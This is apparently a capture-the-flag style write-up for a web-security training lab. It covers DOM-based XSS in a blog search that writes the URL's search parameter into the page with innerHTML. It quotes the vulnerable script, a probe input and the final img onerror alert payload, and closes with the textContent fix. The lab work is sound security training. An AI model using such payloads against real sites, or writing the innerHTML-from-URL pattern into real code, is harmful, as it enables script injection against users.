## 🧪 Lab: DOM XSS in innerHTML sink using source location.search (APPRENTICE)

### 🎯 Mission Description  
This lab contains a **DOM-based XSS** vulnerability in the blog search functionality. It uses `.innerHTML` to inject data from `location.search` directly into the page without sanitization.

### 🎯 Mission Objective  
Trigger an alert using a DOM XSS payload via the `search` parameter in the URL.

### 🧩 Steps  
1. Open the lab URL:  
   ```
   https://0abc0073042520c4a26ea0e1002900e7.web-security-academy.net/?search=test
   ```

2. You’ll see this in the rendered HTML:
   ```html
   <span id="searchMessage">test</span>
   ```

3. View the source code:
   ```html
   <script>
       function doSearchQuery(query) {
           document.getElementById('searchMessage').innerHTML = query;
       }

       var query = (new URLSearchParams(window.location.search)).get('search');

       if(query) {
           doSearchQuery(query);
       }
   </script>
   ```

4. Try an injection test like:
   ```
   ?search=X<"x
   ```

   Result:
   ```html
   <span id="searchMessage">X<"x</span>
   ```

   ✅ Confirms it's directly injected → vulnerable.

5. Final payload:
   ```
   ?search=<img src=x onerror=alert(1)>
   ```

6. The page renders:
   ```html
   <span id="searchMessage"><img src=x onerror=alert(1)></span>
   ```

   💥 Alert box pops → XSS success.

### 💣 Final Payload  
```
https://0abc0073042520c4a26ea0e1002900e7.web-security-academy.net/?search=<img src=x onerror=alert(1)>
```

*(Make sure to URL-encode the payload if needed.)*

### 📝 Notes  
- This is a classic **DOM XSS** using `.innerHTML` as the vulnerable sink.
- The source of the input is `location.search` (i.e., the query string).
- Best fix: replace `innerHTML` with `textContent`.

**Status: Solved ✅**
